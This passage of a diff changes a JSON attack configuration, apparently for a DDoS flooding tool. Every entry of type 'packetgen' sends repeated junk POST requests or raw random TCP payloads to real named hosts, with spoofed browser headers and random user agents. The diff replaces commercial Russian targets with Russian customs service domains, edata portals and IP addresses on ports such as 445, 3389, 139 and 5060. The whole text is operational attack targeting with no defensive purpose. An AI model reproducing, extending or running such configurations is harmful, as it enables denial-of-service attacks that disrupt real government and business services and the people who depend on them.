-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://1rus.ru",
-                                "Referer": "http://1rus.ru",
-                                "X-Forwarded-Host": "1rus.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.5",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.5:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.5",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.5",
-                                "Referer": "http://91.233.82.5",
-                                "X-Forwarded-Host": "91.233.82.5",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.65",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.65:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.65",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.65",
-                                "Referer": "http://91.233.82.65",
-                                "X-Forwarded-Host": "91.233.82.65",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "https://zv.sps-holding.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "zv.sps-holding.ru:443",
+                        "address": "vks.customs.gov.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1175,7 +614,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://zv.sps-holding.ru",
+                            "path": "https://vks.customs.gov.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1188,9 +627,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://zv.sps-holding.ru",
-                                "Referer": "https://zv.sps-holding.ru",
-                                "X-Forwarded-Host": "zv.sps-holding.ru",
+                                "Origin": "https://vks.customs.gov.ru",
+                                "Referer": "https://vks.customs.gov.ru",
+                                "X-Forwarded-Host": "vks.customs.gov.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1201,14 +640,99 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://shop0.sps-holding.ru",
+            "count": 3,
+            "name": "tcp://95.167.108.106:5900",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "shop0.sps-holding.ru:443",
+                        "address": "95.167.108.106:5900"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.165:5100",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.165:5100"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://web4.edata.customs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web4.edata.customs.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://web4.edata.customs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://web4.edata.customs.ru",
+                                "Referer": "http://web4.edata.customs.ru",
+                                "X-Forwarded-Host": "web4.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web01.edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web01.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1219,7 +743,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://shop0.sps-holding.ru",
+                            "path": "https://web01.edata.customs.ru/FtsDataSetWeb/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1232,9 +756,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://shop0.sps-holding.ru",
-                                "Referer": "https://shop0.sps-holding.ru",
-                                "X-Forwarded-Host": "shop0.sps-holding.ru",
+                                "Origin": "https://web01.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web01.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web01.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1245,14 +769,99 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://arenda.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://95.163.64.157:1723",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "arenda.krasnoe-beloe.ru:443",
+                        "address": "95.163.64.157:1723"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://95.167.108.106",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://95.167.108.106",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://95.167.108.106",
+                                "Referer": "http://95.167.108.106",
+                                "X-Forwarded-Host": "95.167.108.106",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.166:5100",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.166:5100"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web1.edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web1.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1263,7 +872,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://arenda.krasnoe-beloe.ru",
+                            "path": "https://web1.edata.customs.ru/FtsDataSetWeb/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1276,9 +885,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://arenda.krasnoe-beloe.ru",
-                                "Referer": "https://arenda.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "arenda.krasnoe-beloe.ru",
+                                "Origin": "https://web1.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web1.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web1.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1289,14 +898,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.84",
+            "count": 3,
+            "name": "http://web1.edata.customs.gov.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.84:80"
+                        "address": "web1.edata.customs.gov.ru:80"
                     }
                 },
                 "packet": {
@@ -1304,7 +913,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://91.233.82.84",
+                            "path": "http://web1.edata.customs.gov.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1317,9 +926,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.84",
-                                "Referer": "http://91.233.82.84",
-                                "X-Forwarded-Host": "91.233.82.84",
+                                "Origin": "http://web1.edata.customs.gov.ru",
+                                "Referer": "http://web1.edata.customs.gov.ru",
+                                "X-Forwarded-Host": "web1.edata.customs.gov.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1330,14 +939,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://84.201.167.117:5432",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49153",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "84.201.167.117:5432"
+                        "address": "92.124.222.26:49153"
                     }
                 },
                 "packet": {
@@ -1352,14 +961,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.3:110",
+            "count": 3,
+            "name": "tcp://77.108.76.165:5101",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.3:110"
+                        "address": "77.108.76.165:5101"
                     }
                 },
                 "packet": {
@@ -1374,55 +983,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://www.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://95.167.108.106:139",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.krasnoe-beloe.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://www.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://www.krasnoe-beloe.ru",
-                                "Referer": "http://www.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "www.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.3:143",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.3:143"
+                        "address": "95.167.108.106:139"
                     }
                 },
                 "packet": {
@@ -1437,14 +1005,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.81:22",
+            "count": 3,
+            "name": "tcp://95.173.158.197:8008",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.81:22"
+                        "address": "95.173.158.197:8008"
                     }
                 },
                 "packet": {
@@ -1459,14 +1027,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://94.26.226.71:22",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49154",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "94.26.226.71:22"
+                        "address": "92.124.222.26:49154"
                     }
                 },
                 "packet": {
@@ -1481,40 +1049,21 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://portal.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49159",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "portal.krasnoe-beloe.ru:80"
+                        "address": "95.167.108.106:49159"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://portal.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://portal.krasnoe-beloe.ru",
-                                "Referer": "http://portal.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "portal.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -1522,14 +1071,36 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://1rus.ru",
+            "count": 3,
+            "name": "tcp://92.124.222.26:135",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "1rus.ru:443",
+                        "address": "92.124.222.26:135"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web02.edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web02.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1540,7 +1111,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://1rus.ru",
+                            "path": "https://web02.edata.customs.ru/FtsDataSetWeb/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1553,9 +1124,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://1rus.ru",
-                                "Referer": "https://1rus.ru",
-                                "X-Forwarded-Host": "1rus.ru",
+                                "Origin": "https://web02.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web02.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web02.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1566,14 +1137,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.5:22",
+            "count": 3,
+            "name": "tcp://89.208.225.13:445",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.5:22"
+                        "address": "89.208.225.13:445"
                     }
                 },
                 "packet": {
@@ -1588,55 +1159,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://kandidat.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "tcp://92.124.222.26:3389",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "kandidat.krasnoe-beloe.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://kandidat.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://kandidat.krasnoe-beloe.ru",
-                                "Referer": "http://kandidat.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "kandidat.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.1:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.1:22"
+                        "address": "92.124.222.26:3389"
                     }
                 },
                 "packet": {
@@ -1651,14 +1181,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.2:22",
+            "count": 3,
+            "name": "tcp://77.108.76.167:5061",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.2:22"
+                        "address": "77.108.76.167:5061"
                     }
                 },
                 "packet": {
@@ -1673,40 +1203,21 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://shop0.sps-holding.ru",
+            "count": 3,
+            "name": "tcp://77.108.76.39:5101",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "shop0.sps-holding.ru:80"
+                        "address": "77.108.76.39:5101"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://shop0.sps-holding.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://shop0.sps-holding.ru",
-                                "Referer": "http://shop0.sps-holding.ru",
-                                "X-Forwarded-Host": "shop0.sps-holding.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -1714,14 +1225,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://access.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "https://webinar.customs.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "access.krasnoe-beloe.ru:443",
+                        "address": "webinar.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1732,7 +1243,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://access.krasnoe-beloe.ru",
+                            "path": "https://webinar.customs.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1745,9 +1256,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://access.krasnoe-beloe.ru",
-                                "Referer": "https://access.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "access.krasnoe-beloe.ru",
+                                "Origin": "https://webinar.customs.ru",
+                                "Referer": "https://webinar.customs.ru",
+                                "X-Forwarded-Host": "webinar.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1758,14 +1269,124 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "https://91.233.82.9",
+            "count": 3,
+            "name": "tcp://95.163.65.62:139",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.9:443",
+                        "address": "95.163.65.62:139"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.165:4444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.165:4444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://92.124.222.26:139",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "92.124.222.26:139"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49157",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "92.124.222.26:49157"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.167:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.167:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web4.edata.customs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web4.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1776,7 +1397,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.233.82.9",
+                            "path": "https://web4.edata.customs.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1789,9 +1410,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.233.82.9",
-                                "Referer": "https://91.233.82.9",
-                                "X-Forwarded-Host": "91.233.82.9",
+                                "Origin": "https://web4.edata.customs.ru",
+                                "Referer": "https://web4.edata.customs.ru",
+                                "X-Forwarded-Host": "web4.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1802,14 +1423,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.4:22",
+            "count": 3,
+            "name": "tcp://95.167.108.106:2968",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.4:22"
+                        "address": "95.167.108.106:2968"
                     }
                 },
                 "packet": {
@@ -1824,14 +1445,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.3:22",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49152",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.3:22"
+                        "address": "92.124.222.26:49152"
                     }
                 },
                 "packet": {
@@ -1846,14 +1467,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "tcp://91.233.82.24:22",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49156",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.233.82.24:22"
+                        "address": "92.124.222.26:49156"
                     }
                 },
                 "packet": {
@@ -1868,178 +1489,14 @@
         },
         {
             "type": "packetgen",
-            "count": 11,
-            "name": "http://lyncdiscover.krasnoe-beloe.ru",
+            "count": 3,
+            "name": "https://web02.edata.customs.ru/FtsPersonalCabinetWeb2017/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "lyncdiscover.krasnoe-beloe.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://lyncdiscover.krasnoe-beloe.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://lyncdiscover.krasnoe-beloe.ru",
-                                "Referer": "http://lyncdiscover.krasnoe-beloe.ru",
-                                "X-Forwarded-Host": "lyncdiscover.krasnoe-beloe.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.83",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.83:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.83",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.83",
